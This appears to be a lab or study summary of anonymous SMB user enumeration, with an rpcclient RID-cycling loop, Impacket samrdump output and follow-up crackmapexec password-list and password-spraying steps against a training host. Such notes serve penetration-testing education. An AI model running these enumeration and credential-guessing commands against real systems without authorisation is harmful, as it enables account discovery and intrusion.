Here’s a **clean, hacker-friendly summary** of the enumeration process with `rpcclient` and `Impacket`:

---

# **Enumerating SMB Users via RPC**

## **1. Using `rpcclient` for RID Cycling**

### **Command**

```bash
for i in $(seq 500 1100); do
  rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | \
  grep "User Name\|user_rid\|group_rid" && echo "";
done
```

### **Explanation**

- `seq 500 1100` → Cycle through **RID range** (commonly where user IDs start).
    
- `-N -U ""` → **Null session** login.
    
- `queryuser` → Queries user info by RID.
    
- `printf '%x\n' $i` → Converts integer RID to hex.
    

### **Sample Output**

```
User Name   : sambauser
user_rid    : 0x1f5
group_rid   : 0x201

User Name   : mrb3n
user_rid    : 0x3e8
group_rid   : 0x201

User Name   : cry0l1t3
user_rid    : 0x3e9
group_rid   : 0x201
```

**Findings:**

- Users discovered:
    
    - `sambauser`
        
    - `mrb3n`
        
    - `cry0l1t3`
        

---

## **2. Dumping User Info with Impacket – `samrdump.py`**

### **Command**

```bash
samrdump.py 10.129.14.128
```

### **Sample Output**

```
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001

mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
mrb3n (1000)/AccountIsDisabled: False

cry0l1t3 (1001)/FullName: cry0l1t3
cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
cry0l1t3 (1001)/AccountIsDisabled: False
```

---

## **3. Key Insights**

- **Null sessions are enabled**, allowing anonymous RID cycling and user enumeration.
    
- Enumerated valid usernames:
    
    - `sambauser`
        
    - `mrb3n`
        
    - `cry0l1t3`
        
- Useful for:
    
    - Brute-force or password-spraying attempts.
        
    - Leveraging SMB-related attacks (relay, hash capture, etc.).
        

---

## **4. Next Steps**

- Use `crackmapexec` for further SMB enumeration:
    
    ```bash
    crackmapexec smb 10.129.14.128 -u users.txt -p passwords.txt
    ```
    
- Try `smbclient` to explore shares:
    
    ```bash
    smbclient -L \\10.129.14.128 -U mrb3n
    ```
    
- Combine with **password spray** or **Kerberoasting** if domain integration is present.
    

---
